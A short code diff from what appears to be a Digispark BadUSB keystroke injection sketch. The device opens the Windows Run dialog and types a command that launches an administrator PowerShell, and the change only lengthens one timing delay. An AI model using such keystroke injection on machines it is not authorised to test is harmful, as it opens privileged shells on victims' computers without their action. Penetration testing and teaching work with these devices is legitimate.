@@ -7,7 +7,7 @@ void setup() {
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
-  DigiKeyboard.delay(100);
+  DigiKeyboard.delay(1000);
   DigiKeyboard.println("powershell Start-Process powershell -Verb runAs");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1000);
